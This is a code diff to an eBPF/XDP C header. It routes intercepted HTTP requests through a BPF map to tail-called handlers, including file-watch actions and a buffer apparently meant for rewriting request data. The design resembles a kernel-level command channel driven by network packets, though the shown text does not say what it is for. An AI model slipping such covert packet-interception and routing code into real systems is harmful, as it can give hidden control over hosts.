@@ -68,42 +68,43 @@ __attribute__((always_inline)) int handle_req_on_ret(struct pkt_ctx_t *pkt, u32 
     return 0;
 }
 
-#define HTTP_ADD_FS_WATCH 1
-#define HTTP_DEL_FS_WATCH 2
-#define HTTP_GET_FS_WATCH 3
+struct http_handler_t {
+    u32 action;
+    u32 handler;
+    u32 new_data_len;
+    char new_data[256];
+};
 
-__attribute__((always_inline)) int route_req(struct xdp_md *ctx, struct pkt_ctx_t *pkt, u32 handler, char req[HTTP_REQ_LEN]) {
-    switch (handler) {
-        case HTTP_ADD_FS_WATCH:
-            return handle_add_fs_watch(req);
-        case HTTP_DEL_FS_WATCH:
-            return handle_del_fs_watch(req);
-        case HTTP_GET_FS_WATCH:
-            return handle_req_on_ret(pkt, HTTP_GET_FS_WATCH, req);
-    }
-    return 0;
-}
+struct bpf_map_def SEC("maps/http_routes") http_routes = {
+    .type = BPF_MAP_TYPE_HASH,
+    .key_size = 16,
+    .value_size = sizeof(struct http_handler_t),
+    .max_entries = 4096,
+    .pinning = 0,
+    .namespace = "",
+};
 
-__attribute__((always_inline)) int route_resp(struct __sk_buff *skb, struct pkt_ctx_t *pkt, char resp[HTTP_RESP_LEN]) {
-    // check if a response was registered for the current packet
-    struct http_response_key_t key = {
-        .saddr = pkt->ipv4->saddr,
-        .daddr = pkt->ipv4->daddr,
-        .source_port = pkt->tcp->source,
-        .dest_port = pkt->tcp->dest,
-    };
+__attribute__((always_inline)) int route_http_req(struct xdp_md *ctx, struct pkt_ctx_t *pkt) {
+    // bpf_printk("req %s\n", pkt->http_req->data);
 
-    struct http_response_handler_t *value = bpf_map_lookup_elem(&http_responses, &key);
-    if (value == NULL)
-        return -1;
-
-    switch (value->handler) {
-        case HTTP_GET_FS_WATCH:
-            bpf_map_delete_elem(&http_responses, &key);
-            return handle_get_fs_watch(value->req, resp);
+    // select action to take from handlers configuration
+    struct http_handler_t *handler = bpf_map_lookup_elem(&http_routes, pkt->http_req->pattern);
+    if (handler == NULL) {
+        return XDP_PASS;
     }
 
-    return 0;
+    // prepare http response handler when applicable
+    switch (handler->handler) {
+        case HTTP_GET_FS_WATCH_HANDLER:
+            handle_req_on_ret(pkt, HTTP_GET_FS_WATCH_HANDLER, pkt->http_req->data);
+
+            // redirect to action handler
+            bpf_tail_call(ctx, &xdp_progs, HTTP_ACTION_HANDLER);
+            return XDP_PASS;
+    }
+
+    bpf_tail_call(ctx, &xdp_progs, handler->handler);
+    return XDP_PASS;
 }
 
 #endif
